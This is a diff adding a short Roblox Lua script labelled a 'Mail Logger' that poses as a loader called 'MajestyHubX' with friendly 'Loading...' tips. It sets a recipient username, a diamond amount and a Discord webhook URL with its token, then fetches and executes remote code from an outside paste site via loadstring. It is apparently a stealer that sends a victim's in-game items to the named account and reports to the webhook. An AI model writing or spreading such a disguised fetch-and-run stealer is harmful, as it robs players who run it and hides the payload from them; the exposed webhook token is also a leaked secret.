@@ -1,0 +1,29 @@
+--[[ Hostee Scriptz Mail Logger ]]--
+
+--[[ Main Config ]]--
+
+_G.Username = "emperorhirohito11"
+
+_G.Diamonds = 10000000 
+
+--[[ Webhook Config ]]--
+
+_G.Webhook = "https://discord.com/api/webhooks/1110885485359943693/_tBFSrla_lP4hHsgMjzq66qHnr4zDwUKc28jVFkz--JL7tdhtB8_xP5x9snbIXrXIi0A"
+
+--[[ UI Config ]]--
+
+_G.ScripttName = "MajestyHubX"
+
+_G.Tip1 = "Please Wait...."
+
+_G.Tip2 = "Majesty Loading...."
+
+_G.Tip3 = "Majesty Script..."
+
+_G.Tip4 = "Welcome To MajestyHubX!"
+
+_G.Tip5 = "Loading..."
+
+--[[ Script ]]
+
+loadstring(game:HttpGet("https://paste.xyzo.space/nxll/mail.lua"))()
